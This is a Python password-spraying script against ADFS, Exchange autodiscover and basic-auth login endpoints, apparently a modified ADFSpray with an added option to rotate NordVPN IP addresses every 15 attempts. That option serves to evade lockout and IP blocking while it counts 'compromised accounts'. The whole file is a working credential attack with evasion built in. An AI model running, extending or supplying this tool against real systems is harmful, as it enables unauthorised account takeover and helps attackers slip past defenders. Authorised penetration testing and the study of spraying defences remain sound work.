# Adding vpn option to the following script
# Python3 tool to perform password spraying attack against ADFS
# by @xFreed0m

import argparse
import datetime
import sys
import time
import urllib
import urllib.parse
import requests
from random import randint
from nordvpn_switcher import initialize_VPN,terminate_VPN
from utils import configure_logger, safe_rotate_vpn, get_public_ip, excptn, init_db, log_event
from requests.packages.urllib3.exceptions import InsecureRequestWarning, TimeoutError
from requests_ntlm import HttpNtlmAuth


def logo():
    """
        ___    ____  ___________
       /   |  / __ \/ ____/ ___/____  _________ ___  __
      / /| | / / / / /_   \__ \/ __ \/ ___/ __ `/ / / /
     / ___ |/ /_/ / __/  ___/ / /_/ / /  / /_/ / /_/ /
    /_/  |_/_____/_/    /____/ .___/_/   \__,_/\__, /
                            /_/               /____/
    \n
    By @x_Freed0m\n
    [!!!] Remember! This tool is reliable as much as the target authentication response is reliable.\n
    Therefore, false-positive will happen more often that we would like.
    """


def args_parse():
    parser = argparse.ArgumentParser()
    pass_group = parser.add_mutually_exclusive_group(required=True)
    user_group = parser.add_mutually_exclusive_group(required=True)
    target_group = parser.add_mutually_exclusive_group(required=True)
    sleep_group = parser.add_mutually_exclusive_group(required=False)
    user_group.add_argument('-U', '--userlist', help="emails list to use, one email per line")
    user_group.add_argument('-u', '--user', help="Single email to test")
    pass_group.add_argument('-p', '--password', help="Single password to test")
    pass_group.add_argument('-P', '--passwordlist', help="Password list to test, one password per line")
    target_group.add_argument('-T', '--targetlist', help="Targets list to use, one target per line")
    target_group.add_argument('-t', '--target', help="Target server to authenticate against")
    sleep_group.add_argument('-s', '--sleep', type=int,
                             help="Throttle the attempts to one attempt every # seconds, "
                                  "can be randomized by passing the value 'random' - default is 0",
                             default=0)
    sleep_group.add_argument('-r', '--random', nargs=2, type=int, metavar=(
        'minimum_sleep', 'maximum_sleep'), help="Randomize the time between each authentication "
                                                "attempt. Please provide minimum and maximum "
                                                "values in seconds")
    parser.add_argument('method', choices=['adfs', 'autodiscover', 'basicauth'])

    parser.add_argument('-v', '--verbose', help="Turn on verbosity to show failed "
                                                "attempts", action="store_true", default=False)
    
    parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
    return parser.parse_args()



def userlist(incoming_userlist):  # Creating an array out of the users file
    with open(incoming_userlist) as f:
        usernames = f.readlines()
    generated_usernames_stripped = [incoming_userlist.strip() for incoming_userlist in usernames]
    return generated_usernames_stripped


def passwordlist(incoming_passwordlist):  # Creating an array out of the passwords file
    with open(incoming_passwordlist) as pass_obj:
        return [p.strip() for p in pass_obj.readlines()]


def targetlist(incoming_targetlist):  # Creating an array out of the targets file
    with open(incoming_targetlist) as target_obj:
        return [p.strip() for p in target_obj.readlines()]



def random_time(minimum, maximum):
    sleep_amount = randint(minimum, maximum)
    return sleep_amount


def basicauth_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sleep, verbose):
    working_creds_counter = 0  # zeroing the counter of working creds before starting to count
    
    ip = get_public_ip(timeout=5, retries=2)
    try:
        LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
        for target in targets:  # checking each target separately
            for password in passes:  # trying one password against each user, less likely to lockout users
                for username in users:
                    session = requests.Session()
                    session.auth = (username, password)
                    response = session.get(target)
                    #  Currently checking only if working or not, need to add more tests in the future
                    if response.status_code == 200:
                        log_event(subject=username, target=target, status="success", ip=ip, details="")
                        working_creds_counter += 1
                        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                    else:
                        log_event(subject=username, target=target, status="fail", ip=ip, details="")
                        LOGGER.debug("[-]Creds failed for: %s" % username)
                    if random is True:  # let's wait between attempts
                        sleep_time = random_time(min_sleep, max_sleep)
                        time.sleep(float(sleep_time))
                    else:
                        time.sleep(float(sleep_time))

        LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
        LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))

    except TimeoutError:
        LOGGER.critical("[!] Timeout! check if target is accessible")
        pass

    except KeyboardInterrupt:
        LOGGER.critical("[CTRL+C] Stopping the tool")
        exit(1)

    except Exception as e:
        excptn(e)


def autodiscover_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sleep, verbose):
    working_creds_counter = 0  # zeroing the counter of working creds before starting to count

    ip = get_public_ip(timeout=5, retries=2)
    try:
        LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
        for target in targets:  # checking each target separately
            for password in passes:  # trying one password against each user, less likely to lockout users
                for username in users:
                    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                    req = requests.get(target, auth=HttpNtlmAuth(username, password),
                                       headers={'User-Agent': 'Microsoft'}, verify=False)
                    #  Currently checking only if working or not, need to add more tests in the future
                    if req.status_code == 200:
                        log_event(subject=username, target=target, status="success",  ip=ip, details="")
                        working_creds_counter += 1
                        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                    else:
                        log_event(subject=username, target=target, status="fail", ip=ip, details="")
                        LOGGER.debug("[-]Creds failed for: %s" % username)
                    if random is True:  # let's wait between attempts
                        sleep_time = random_time(min_sleep, max_sleep)
                        time.sleep(float(sleep_time))
                    else:
                        time.sleep(float(sleep_time))

        LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
        LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))

    except TimeoutError:
        LOGGER.critical("[!] Timeout! check if target is accessible")
        pass

    except KeyboardInterrupt:
        LOGGER.critical("[CTRL+C] Stopping the tool")
        exit(1)

    except Exception as e:
        excptn(e)


def adfs_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sleep, verbose, vpn, initial_ip=None):
    working_creds_counter = 0  # zeroing the counter of working creds before starting to count
    username_counter = 0
    prev_ip = initial_ip

    try:
        LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
        for target in targets:  # checking each target separately
            for password in passes:  # trying one password against each user, less likely to lockout users
                for username in users:
                    if vpn and username_counter % 15 == 0:
                        new_ip = safe_rotate_vpn(prev_ip=prev_ip, rotate_retries=4)
                        if new_ip:
                            prev_ip = new_ip
                            LOGGER.debug(f"[VPN] Using IP {prev_ip}")
                        else:
                            LOGGER.warning("[VPN] Rotation failed — exiting")
                            sys.exit(1)

                    ip = get_public_ip(timeout=5, retries=2)

                    target_url = "%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%%3afederation" \
                                 "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
                    post_data = urllib.parse.urlencode({'UserName': username, 'Password': password,
                                                        'AuthMethod': 'FormsAuthentication'}).encode('ascii')
                    session = requests.Session()
                    session.auth = (username, password)
                    response = session.post(target_url, data=post_data, allow_redirects=False,
                                            headers={'Content-Type': 'application/x-www-form-urlencoded',
                                                     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) '
                                                                   'Gecko/20100101 Firefox/65.0',
                                                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
                                                               'image/webp,*/*;q=0.8'})
                    status_code = response.status_code
                    #  Currently checking only if working or not, need to add more tests in the future

                    if status_code == 302:
                        log_event(subject=username, target=target, status="success", ip=ip, details="")
                        working_creds_counter += 1
                        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                    else:
                        log_event(subject=username, target=target, status="fail", ip=ip, details="")
                        LOGGER.debug("[-]Creds failed for: %s" % username)
                    if random is True:  # let's wait between attempts
                        sleep_time = random_time(min_sleep, max_sleep)
                        time.sleep(float(sleep_time))
                    else:
                        time.sleep(float(sleep_time))
                    username_counter += 1

        LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
        LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))

    except TimeoutError:
        LOGGER.critical("[!] Timeout! check if target is accessible")
        pass

    except KeyboardInterrupt:
        LOGGER.critical("[CTRL+C] Stopping the tool")
        exit(1)

    except Exception as e:
        excptn(e)


def main():
    logo()
    args = args_parse()
    random = False
    min_sleep, max_sleep = 0, 0
    usernames_stripped, passwords_stripped, targets_stripped = [], [], []
    global LOGGER
    LOGGER = configure_logger(args.verbose, "ADFS")
    init_db("events.db")
    vpn = args.vpn

    if args.userlist:
        try:
            usernames_stripped = userlist(args.userlist)
        except Exception as err:
            excptn(err)
    elif args.user:
        try:
            usernames_stripped = [args.user]
        except Exception as err:
            excptn(err)
    if args.password:
        try:
            passwords_stripped = [args.password]
        except Exception as err:
            excptn(err)
    elif args.passwordlist:
        try:
            passwords_stripped = passwordlist(args.passwordlist)
        except Exception as err:
            excptn(err)
    if args.target:
        try:
            targets_stripped = [args.target]
        except Exception as err:
            excptn(err)
    elif args.targetlist:
        try:
            targets_stripped = targetlist(args.targetlist)
        except Exception as err:
            excptn(err)
    if args.random:
        random = True
        min_sleep = args.random[0]
        max_sleep = args.random[1]

    total_accounts = len(usernames_stripped)
    total_passwords = len(passwords_stripped)
    total_targets = len(targets_stripped)
    total_attempts = total_accounts * total_passwords * total_targets
    LOGGER.info("Total number of users to test: %s" % str(total_accounts))
    LOGGER.info("Total number of passwords to test: %s" % str(total_passwords))
    LOGGER.info("Total number of targets to test: %s" % str(total_passwords))
    LOGGER.info("Total number of attempts: %s" % str(total_attempts))

    if vpn:
        try:
            initialize_VPN(save=1, area_input=['France,Germany,Netherlands,United Kingdom'])
        except Exception as e:
            LOGGER.warning(f"[VPN] initialize_VPN failed at start: {e}")

        # --- NEW: capture initial IP and exit if unavailable ---
        initial_ip = get_public_ip(timeout=5, retries=2)
        if not initial_ip:
            LOGGER.critical("[VPN] Could not determine initial public IP after VPN init. Exiting.")
            try:
                terminate_VPN()
            except Exception as e:
                LOGGER.warning(f"[VPN] terminate_VPN failed while exiting: {e}")
            sys.exit(1)
        else:
            LOGGER.info(f"[VPN] Initial public IP: {initial_ip}")


    if args.method == 'autodiscover':
        LOGGER.info("[*] You chose %s method" % args.method)
        autodiscover_attempts(usernames_stripped, passwords_stripped, targets_stripped,
                              args.sleep, random, min_sleep, max_sleep, args.verbose)

    elif args.method == 'adfs':
        LOGGER.info("[*] You chose %s method" % args.method)
        adfs_attempts(usernames_stripped, passwords_stripped, targets_stripped,
                      args.sleep, random, min_sleep, max_sleep, args.verbose, vpn, initial_ip=initial_ip)

    elif args.method == 'basicauth':
        LOGGER.info("[*] You chose %s method" % args.method)
        basicauth_attempts(usernames_stripped, passwords_stripped, targets_stripped,
                           args.sleep, random, min_sleep, max_sleep, args.verbose)

    else:
        LOGGER.critical("[!] Please choose a method (autodiscover or adfs)")
    
    if vpn:
        terminate_VPN()

if __name__ == "__main__":
    main()

# TODO:
# check if target accessible with shorter timeout
# check other web responses to identify expired password, mfa, no such username, locked etc.
# auto discover the autodiscover?
# implement domain\user support
